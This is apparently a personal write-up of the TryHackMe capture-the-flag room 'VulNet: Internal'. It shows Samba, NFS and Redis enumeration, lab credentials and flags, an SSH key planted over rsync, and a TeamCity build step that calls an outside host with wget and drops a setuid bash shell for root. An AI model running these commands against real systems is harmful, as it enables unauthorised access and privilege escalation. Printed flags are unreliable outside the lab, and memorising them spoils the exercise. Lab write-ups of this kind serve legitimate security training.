# Tryhackme.com Room : VulNet: Internal

`https://tryhackme.com/room/vulnnetinternal`

## Instance

```bash
export IP="10.10.128.223"
```

## Nmap

```
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      47910/udp6  mountd
|   100005  1,2,3      48131/tcp6  mountd
|   100005  1,2,3      54926/udp   mountd
|   100005  1,2,3      59499/tcp   mountd
|   100021  1,3,4      34887/tcp   nlockmgr
|   100021  1,3,4      36002/udp   nlockmgr
|   100021  1,3,4      37411/tcp6  nlockmgr
|   100021  1,3,4      39012/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
9090/tcp  filtered zeus-admin
20000/tcp filtered dnp
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-24T23:54:10+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-24T21:54:10
|_  start_date: N/A
```



## Initial foothold

Let's look at the `samba` share. We can mount it using 

```
sudo mount -t cifs //10.10.128.223/shares smb_share
```

The share contains :

```
├── data
│   ├── business-req.txt
│   └── data.txt
└── temp
    └── services.txt
```

We get the first flag in `service.txt` :

```
THM{0a09d51e488f5fa105d8d866a497440a}
```

`data.txt` contains :

```
Purge regularly data that is not needed anymore
```

And `business-req.txt` contains :

```
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

Hmm the message is a bit cryptic, let's look at the other services.



There is an `rsync` server on port `873` we try to copy files using 

```
rsync -av rsync://10.10.128.223/files rsyn_shared
```

But we need a password to access the `files` folder.



By running `enum4linux` we find pretty much the info that `nmap` gave us.

We do find a username tho :

````
nobody
````

Let's look at the `nfs` share.

Running `showmount -e 10.10.128.223` we get :

```
/opt/conf *
```

We mount the share using :

```
sudo mount -t nfs 10.10.128.223:/opt/conf nfs_share/
```

Which give us a bunch of config files :

```
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg
```

We see that there is a local `redis` instance running on port `6379`

We see in the redis config file.

```
requirepass "B65Hx562F@ggAZ@F"
```

 Maybe we can reuse this password ?

Doesn't work for `ssh` as `nobody`. Neither for `rsync`

Didn't find anything else in the config. There is a `hplip.conf` file which might suggest that a printer server is running on the server ??



I was kinda stuck there, so I did take a look at a write up for a hint. Turns out we can connect to the `redis` instance remotely. Would have thought that it would have shown in `nmap`.. that's why I didn't even try.. Anyways now we can retrieve some stuff from the database.

We connect using `redis-cli -h 10.10.128.223 -a B65Hx562F@ggAZ@F`

We can then list all the keys with `keys *`

```
1) "authlist"
2) "marketlist"
3) "int"
4) "tmp"
5) "internal flag"
```

Now to retrieve the data, we must first know the type of the data we want to retrieve ([See this stack overflow post](https://stackoverflow.com/questions/8078018/get-redis-keys-and-values-at-command-prompt)).

We find the type for authlist using `type authlist` we get a `list`.

We can dump the content using `lrange authlist 0 -1` :

```
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

We get a `base64` blob that decodes to 

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

Great ! now we can rsync in. Let's see what else we can find in the db.

Indeed we find a flag with `get 'internal flag'` :

```
THM{ff8e518addbbddb74531a724236a8221}
```



We download all the file using `rsync` on out machine with `rsync -av rsync://rsync-connect@10.10.128.223/files rsyn_shared`.

Seems like it's the home directory for the user `sys-internal` (judging by the mozilla cache being synced)... this is slow...real slow.. I guess there is a bunch of file in there just to troll us in downloading them all.



Now that everything is downloaded, we see that it is indeed the `home` directory for `sys-internal` user.

Let's try to upload our public key to the `.ssh` folder :

```
rsync -av authorized_keys rsync://rsync-connect@10.10.128.223/files/sys-internal/.ssh
```

And it worked ! Now we can login using `ssh`



We find the `/home/ssys-internal/user.txt` :

```
THM{da7c20696831f253e0afaca8b83c07ab}
```



## Priv Esc

We can't `sudo`. Doesn't seem to have `suid` binaries.

The fact that the whole mozilla folder is there is intriguing. I remember that I retrieved the saved password using some tool in a previous challenge. Let's try to find the tool.

Got it, the tool is `https://github.com/unode/firefox_decrypt`

Actually, this was a deadend, I tried bruteforcing the master password for a while but didn't get anything.



I found that `Teamcity` is running (Apparently a `CI/CD` tool).

It's running only on `127.0.0.1:8111`. We can forward the port using `ssh` :

```
ssh -i id_rsa -L 8111:localhost:8111 sys-internal@10.10.128.223
```

Then we can browse the website on our machine.

We are redirected to a login page which says that no `super account` was created yet. We click the link and it ask for an authentication token that is located in `/TeamCity/logs/teamcity-server.log`. 

Unfortunately we don't have read permission for this file. But then looking at the file that we can read, we see `catalina.out` and here it is ! We get the token and create the `super account`

We then create a new project, a new build configuration and finally we add a `command line` build step. 

We add the following lines as the `build step` custom script :

```
wget http://10.6.32.20:8000/runned-$(whoami)
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

And then from our `sys-internal` shell we can just `/tmp/bash -p` and we are `root` !



`/root/root.txt` :

```
THM{e8996faea46df09dba5676dd271c60bd}
```



## Wrap up

* I did miss the `redis` port. I runned again a full port scan and found that it was indeed available so my bad for not seeing it.
* I did find out about `TeamCity` by running `linpeas`. Should have caught this before. Didn't check what processes was running and I didn't check what ports were open. Look this up before running linpeas.

